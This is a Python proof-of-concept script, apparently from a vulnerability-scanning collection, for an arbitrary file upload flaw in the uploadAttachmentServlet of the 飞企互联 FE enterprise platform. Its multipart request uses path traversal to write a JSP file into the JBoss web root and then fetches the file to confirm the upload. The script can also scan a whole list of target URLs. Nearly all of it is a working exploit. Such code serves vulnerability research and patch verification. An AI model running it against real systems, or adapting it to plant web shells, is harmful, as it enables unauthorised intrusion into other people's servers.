import requests
import random
import string
import argparse
from urllib3.exceptions import InsecureRequestWarning

# 颜色代码，用于终端输出
RED = '\033[91m'
RESET = '\033[0m'

# 忽略不安全请求的警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def banner():
    """
    打印程序的banner信息。
    """
    banner = """
 ██▓    ▄▄▄       ███▄ ▄███▓    ██ ▄█▀ ██▓ ███▄    █   ▄████ 
▓██▒   ▒████▄    ▓██▒▀█▀ ██▒    ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██▒   ▒██  ▀█▄  ▓██    ▓██░   ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
░██░   ░██▄▄▄▄██ ▒██    ▒██    ▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
░██░    ▓█   ▓██▒▒██▒   ░██▒   ▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
░▓      ▒▒   ▓▒█░░ ▒░   ░  ░   ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
 ▒ ░     ▒   ▒▒ ░░  ░      ░   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
 ▒ ░     ░   ▒   ░      ░      ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
 ░           ░  ░       ░      ░  ░    ░           ░       ░ 
                                        info:飞企互联-FE企业运营管理平台uploadAttachmentServlet任意文件上传漏洞     
                                        version:1.0 author:YeahSir               
"""
    print(banner) 

def rand_base(n):
    """
    生成一个长度为n的随机字符串，由小写字母和数字组成。
    """
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def poc(url):
    """
    检查目标URL是否存在飞企互联-FE企业运营管理平台uploadAttachmentServlet任意文件上传漏洞。

    :param url: 目标URL
    """
    filename = rand_base(6)  # 随机生成一个文件名
    upload_url = url.rstrip('/') + '/servlet/uploadAttachmentServlet'  # 构建上传文件的URL
    upload_headers = {  # 设置请求头
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0)',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk'
    }
    upload_data = (  # 设置上传文件的数据
        '------WebKitFormBoundaryKNt0t4vBe8cX9rZk\r\n'
        f'Content-Disposition: form-data; name="uploadFile"; filename="../../../../../jboss/web/fe.war/{filename}.jsp"\r\n'
        'Content-Type: text/plain\r\n\r\n'
        '<% out.println("123123");%>\r\n'
        '------WebKitFormBoundaryKNt0t4vBe8cX9rZk\r\n'
        'Content-Disposition: form-data; name="json"\r\n\r\n'
        '{"iq":{"query":{"UpdateType":"mail"}}}\r\n'
        '------WebKitFormBoundaryKNt0t4vBe8cX9rZk--'
    )

    try:
        # 发送文件上传请求
        response_upload = requests.post(upload_url, headers=upload_headers, data=upload_data, verify=False, timeout=30)
        access_url = url.rstrip('/') + f'/{filename}.jsp;'  # 构建访问上传文件的URL
        # 发送请求访问上传的文件
        response_access = requests.get(access_url, verify=False, timeout=30)

        # 检查响应状态码和响应内容，判断是否存在漏洞
        if response_upload.status_code == 200 and response_access.status_code == 200 and "123123" in response_access.text:
            print(f"{RED}URL [{url}] 存在飞企互联-FE企业运营管理平台uploadAttachmentServlet任意文件上传漏洞{RESET}")
        else:
            print(f"URL [{url}] 不存在漏洞")
    except requests.exceptions.Timeout:
        print(f"URL [{url}] 请求超时，可能存在漏洞")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    """
    主函数，解析命令行参数并调用POC函数进行漏洞检测。
    """
    banner()
    parser = argparse.ArgumentParser(description='检测目标地址是否存在飞企互联-FE企业运营管理平台uploadAttachmentServlet任意文件上传漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        # 确保URL以http或https开头
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        poc(args.url)  # 检测单个URL
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                # 确保URL以http或https开头
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                poc(url)  # 检测多个URL

if __name__ == '__main__':
    main()